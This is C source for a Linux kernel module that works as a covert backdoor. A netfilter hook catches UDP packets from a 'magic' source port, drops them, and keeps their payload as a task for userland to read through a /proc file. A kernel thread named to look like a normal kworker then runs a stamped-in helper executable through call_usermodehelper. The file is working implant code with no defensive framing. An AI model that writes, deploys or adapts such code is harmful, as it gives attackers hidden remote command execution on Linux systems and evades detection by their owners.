
#include <linux/delay.h>
#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/version.h>

#include <stddef.h>

#include "macros.h"
#include "blanko.h"

// *** magic value to stamp over ***
static const char c_user_exe_path[255] = "BASKETBALLJONES";

static struct nf_hook_ops s_hookops = {0};
static struct proc_dir_entry* s_procfile = NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static struct proc_ops s_procfileops;
#else
static struct file_operations s_procfileops;
#endif

static struct task_struct *s_kthread = NULL;
static bool s_task_pending = false;
static char *s_current_task = NULL;

// Procfile READ callback - reports the stored task to userland
ssize_t read_callback(struct file* filep, char __user* buf, size_t count, loff_t* ppos)
{
    ssize_t retval = 0;
    size_t len = strnlen(s_current_task, MAX_DATA_SIZE);
    KERNEL_LOG("MONSTARS_NF : file READ (size %lu, off %lld)\n", count, *ppos);

    // Simplification: dump the whole task at once, always.
    if ((0 == *ppos) && (s_task_pending) && (count > len))
    {
        if (0 != copy_to_user(buf, s_current_task, len))
        {
            retval = -EFAULT;
        }
        else
        {
            retval = len;
            *ppos = len;
            memset(s_current_task, 0, MAX_DATA_SIZE);
            s_task_pending = false;
        }
    }
    return retval;
}

// Procfile WRITE callback - not supported
ssize_t write_callback(struct file* filep, const char __user* buf, size_t count, loff_t* ppos)
{
    KERNEL_LOG("MONSTARS_NF : file WRITE \n");
    return (ssize_t)-1;
}

// The netfilter callback - checks for magic packets
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 1, 0)
unsigned int nf_callback(void* priv, struct sk_buff* sockbuf, const struct nf_hook_state* state)
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 13, 0)
unsigned int nf_callback(const struct nf_hook_ops* ops, struct sk_buff* sockbuf, const struct net_device* in,
                    const struct net_device* out, int (*okfn)(struct sk_buff *))
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 0, 0)
unsigned int nf_callback(unsigned int hooknum, struct sk_buff* sockbuf, const struct net_device* in,
                    const struct net_device* out, int (*okfn)(struct sk_buff *))
#endif
{
    unsigned int retval = NF_ACCEPT;
    struct iphdr *iph = NULL;
    // struct tcphdr *tcph = NULL;
    struct udphdr *udph = NULL;
    unsigned short src_port = 0;
    unsigned short dst_port = 0;
    unsigned char* data = NULL;

    if (sockbuf)
    {
        if ((iph = ip_hdr(sockbuf)))
        {
            // if (IPPROTO_TCP == iph->protocol)
            // {
            //     if ((tcph = (struct tcphdr *)((__u32 *)iph + iph->ihl)))
            //     {
            //         src_port = ntohs(tcph->source);
            //         dst_port = ntohs(tcph->dest);
            //     }
            //     if ((data = (unsigned char *)tcp_hdr(sockbuf)))
            //     {
            //         data += sizeof(struct tcphdr);
            //     }
            // }
            if (IPPROTO_UDP == iph->protocol)
            {
                if ((udph = (struct udphdr *)((__u32 *)iph + iph->ihl)))
                {
                    src_port = ntohs(udph->source);
                    dst_port = ntohs(udph->dest);
                }
                if ((data = (unsigned char *)udp_hdr(sockbuf)))
                {
                    data += sizeof(struct udphdr);
                }
            }
            // look for magic source port
            if (MAGIC_SRC_PORT == src_port)
            {
                KERNEL_LOG("MONSTARS_NF : Magic packet %pI4:%d --> %pI4:%d\n",
                        &iph->saddr, src_port, &iph->daddr, dst_port);
                if (NULL != data)
                {
                    snprintf(s_current_task, MAX_DATA_SIZE, "%pI4:%s", &iph->saddr, data);
                    KERNEL_LOG("MONSTARS_NF : %s\n", s_current_task);
                    s_task_pending = true;
                }
                retval =  NF_DROP;
            }
        }
    }
    return retval;
}

// worker thread
int task_thread(void *data)
{
    char *um_args[] = {(char *)c_user_exe_path, NULL};
    char *um_env[] = {"HOME=/", NULL};
    int user_ret = 0;

    KERNEL_LOG("MONSTARS_NF : Task thread started\n");

    while(!kthread_should_stop())
    {
        ssleep(1);
        if (s_task_pending)
        {
            // spawn userland cmd handler
            KERNEL_LOG("MONSTARS_NF : Spawning %s\n", c_user_exe_path);
            user_ret = call_usermodehelper((char *)c_user_exe_path, um_args, um_env, UMH_WAIT_EXEC);
            KERNEL_LOG("MONSTARS_NF : Usermode helper returned: %d\n", user_ret);
        }
    }

    KERNEL_LOG("MONSTARS_NF : Task thread terminated\n");
    return 0;
}

// Setup
int __init init_module()
{
    int retval = 0;

    // Allocate task buffer
    s_current_task = (char *)kmalloc(MAX_DATA_SIZE, GFP_KERNEL);
    if (NULL == s_current_task)
    {
        KERNEL_LOG("MONSTARS_NF : Could not allocate task buffer!\n");
        retval = -1;
        goto cleanup;
    }

    // Netfilter hooks
    s_hookops.hook      = (nf_hookfn *) nf_callback;
    s_hookops.hooknum   = NF_INET_PRE_ROUTING;
    s_hookops.pf        = PF_INET;
    s_hookops.priority  = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    if (nf_register_net_hook(&init_net, &s_hookops))
#else
    if (nf_register_hook(&s_hookops))
#endif
    {
        KERNEL_LOG("MONSTARS_NF : Error registering hook!\n");
        retval = -2;
        goto cleanup;
    }
    
    // Procfile hooks
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
    s_procfileops.proc_read = read_callback;
    s_procfileops.proc_write = write_callback;
#else
    s_procfileops.read = read_callback;
    s_procfileops.write = write_callback;
#endif
    
    s_procfile = proc_create(PROCFS_FILENAME, PROCFS_PERMISSIONS, NULL, &s_procfileops);
    if (NULL == s_procfile)
    {
        KERNEL_LOG("MONSTARS_NF : Error creating /proc file!\n");
        retval = -3;
        goto cleanup;
    }

    // kthread worker
    s_kthread = kthread_run(task_thread, NULL, "kworker/l:0");
    if (NULL == s_kthread)
    {
        KERNEL_LOG("MONSTARS_NF : Error starting kthread!\n");
        retval = -4;
        goto cleanup;
    }

cleanup:

    if (0 != retval)
    {
        cleanup_module();
    }

    KERNEL_LOG("MONSTARS_NF : Module init returned %d\n", retval);
    return retval;
}

// Cleanup
void __exit cleanup_module()
{
    // Unregister netfilter hook
    if (NULL != s_hookops.hook)
    {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
        nf_unregister_net_hook(&init_net, &s_hookops);
#else
        nf_unregister_hook(&s_hookops);
#endif
    }

    // Remove /proc file
    if (NULL != s_procfile)
    {
        proc_remove(s_procfile);
    }

    // Stop kthread
    if (NULL != s_kthread)
    {
        kthread_stop(s_kthread);
    }

    // Free task buffer
    if (NULL != s_current_task)
    {
        kfree(s_current_task);
        s_current_task = NULL;
    }

    KERNEL_LOG("MONSTARS_NF : Module decharged.\n");
}
